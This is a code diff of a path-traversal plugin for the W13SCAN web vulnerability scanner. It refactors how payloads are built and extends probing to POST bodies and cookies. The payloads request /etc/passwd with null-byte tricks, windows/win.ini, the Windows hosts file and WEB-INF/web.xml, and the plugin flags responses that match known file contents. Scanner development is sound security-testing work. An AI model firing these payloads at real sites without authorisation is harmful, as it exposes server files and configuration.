@@ -4,49 +4,43 @@
 # @Author  : w8ay
 # @File    : directory_traversal.py
 import copy
-import os
 import re
-from urllib.parse import unquote, urlencode
+from urllib.parse import unquote
 
 import requests
 
-from W13SCAN.lib.const import acceptedExt, Level
-from W13SCAN.lib.output import out
-from W13SCAN.lib.plugins import PluginBase
+from lib.core.common import paramsCombination, generateResponse
+from lib.core.data import conf
+from lib.core.enums import HTTPMETHOD, PLACE, OS, WEB_PLATFORM, VulType
+from lib.core.output import ResultObject, output
+from lib.core.plugins import PluginBase
 
 
 class W13SCAN(PluginBase):
     name = '路径穿越插件'
-    desc = '''支持多平台payload'''
-    level = Level.MIDDLE
+
+    def generate_payloads(self):
+        payloads = []
+        default_extension = ".jpg"
+        payloads.append("../../../../../../../../../../../etc/passwd%00")
+        payloads.append("/etc/passwd")
+        if OS.LINUX in self.response.os or OS.DARWIN in self.response.os or conf.level >= 4:
+            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
+            payloads.append(
+                "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
+        if OS.WINDOWS in self.response.os:
+            payloads.append("../../../../../../../../../../windows/win.ini")
+            # if origin:
+            #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
+            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
+        if WEB_PLATFORM.JAVA in self.response.programing:
+            payloads.append("/WEB-INF/web.xml")
+            payloads.append("../../WEB-INF/web.xml")
+        return payloads
 
     def audit(self):
-        method = self.requests.command  # 请求方式 GET or POST
-        headers = self.requests.get_headers()  # 请求头 dict类型
-        url = self.build_url()  # 请求完整URL
 
-        resp_data = self.response.get_body_data()  # 返回数据 byte类型
-        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
-        resp_headers = self.response.get_headers()  # 返回头 dict类型
-
-        p = self.requests.urlparse
-        params = self.requests.params
-        netloc = self.requests.netloc
-
-        if p.query == '':
-            return
-        iswin = isunix = isjava = 0  # 三种状态 0 未知 1 确定 2 否定
-
-        if self.response.system == "WINDOWS":
-            iswin = 1
-            isunix = 2
-        elif self.response.system == "*NIX":
-            iswin = 2
-            isunix = 1
-        if self.response.language == "JAVA":
-            isjava = 1
-        elif not self.response.language:
-            isjava = 2
+        headers = self.requests.headers
 
         plainArray = [
             "; for 16-bit app support",
@@ -64,58 +58,47 @@ class W13SCAN(PluginBase):
             "<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
             "(<web-app[\s\S]+<\/web-app>)"
         ]
-        exi = os.path.splitext(p.path)[1]
-        if exi not in acceptedExt:
-            return
+        iterdatas = []
+        if self.requests.method == HTTPMETHOD.GET:
+            iterdatas.append((self.requests.params, PLACE.GET))
+        elif self.requests.method == HTTPMETHOD.POST:
+            iterdatas.append((self.requests.post_data, PLACE.POST))
+        if conf.level >= 3:
+            iterdatas.append((self.requests.cookies, PLACE.COOKIE))
 
-        if method == "GET":
-            for k, v in params.items():
+        for item in iterdatas:
+            iterdata, positon = item
+            for k, v in iterdata.items():
                 if ("." in v or "/" in v) or (k.lower() in ['filename', 'file', 'path', 'filepath']):
-                    default_extension = 'jpg'
-                    exi = os.path.splitext(v)[1]
-                    origin = False
-                    dirname = ''
-                    if exi != "":
-                        origin = True
-                        dirname = os.path.dirname(v)
-                    if "." in exi:
-                        default_extension = exi[1:]
-                    data = copy.deepcopy(params)
-                    payloads = []
-
-                    if 1 >= isunix >= 0:
-                        payloads.append("../../../../../../../../../../etc/passwd")
-                        payloads.append("/etc/passwd")
-                        if origin:
-                            payloads.append(dirname + "/../../../../../../../../../../etc/passwd")
-                            payloads.append(dirname + "/../../../../../../../../../../etc/passwd{}".format(
-                                unquote("%00") + default_extension))
-                        payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
-                        payloads.append(
-                            "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
-                    if 1 >= iswin >= 0:
-                        payloads.append("../../../../../../../../../../windows/win.ini")
-                        if origin:
-                            payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
-                        payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
-                    if 1 >= isjava >= 0:
-                        payloads.append("/WEB-INF/web.xml")
-                        payloads.append("../../WEB-INF/web.xml")
-
-                    issucc = False
-
+                    data = copy.deepcopy(iterdata)
+                    payloads = self.generate_payloads()
                     for payload in payloads:
                         data[k] = payload
-                        r = requests.get(netloc, params=urlencode(data, safe='/'), headers=headers)
-                        for i in plainArray:
-                            if i in r.text:
-                                out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
-                                issucc = True
-                                break
-                        for i in regexArray:
-                            if re.search(i, r.text, re.I | re.S | re.M):
-                                out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
-                                issucc = True
-                                break
-                        if issucc:
-                            break
+                        params = paramsCombination(data, positon)
+                        if positon == PLACE.GET:
+                            r = requests.get(self.requests.netloc, params=params, headers=headers)
+                        elif positon == PLACE.POST:
+                            r = requests.post(self.requests.url, data=params, headers=headers)
+                        elif positon == PLACE.COOKIE:
+                            if self.requests.method == HTTPMETHOD.GET:
+                                r = requests.get(self.requests.url, headers=headers, cookies=params)
+                            elif self.requests.method == HTTPMETHOD.POST:
+                                r = requests.post(self.requests.url, data=self.requests.post_data, headers=headers,
+                                                  cookies=params)
+                        html1 = r.text
+                        for plain in plainArray:
+                            if plain in html1:
+                                result = ResultObject(self)
+                                result.init_info(self.requests.url, "目录穿越导致任意文件被读取", VulType.PATH_TRAVERSAL)
+                                result.add_detail("payload探测", r.reqinfo, generateResponse(r),
+                                                  "探测payload:{},并发现回显{}".format(data[k], plain), k, data[k], positon)
+                                output.success(result)
+                                return
+                        for regex in regexArray:
+                            if re.search(regex, html1, re.I | re.S | re.M):
+                                result = ResultObject(self)
+                                result.init_info(self.requests.url, "目录穿越导致任意文件被读取", VulType.PATH_TRAVERSAL)
+                                result.add_detail("payload探测", r.reqinfo, generateResponse(r),
+                                                  "探测payload:{},并发现正则回显{}".format(data[k], regex), k, data[k], positon)
+                                output.success(result)
+                                return
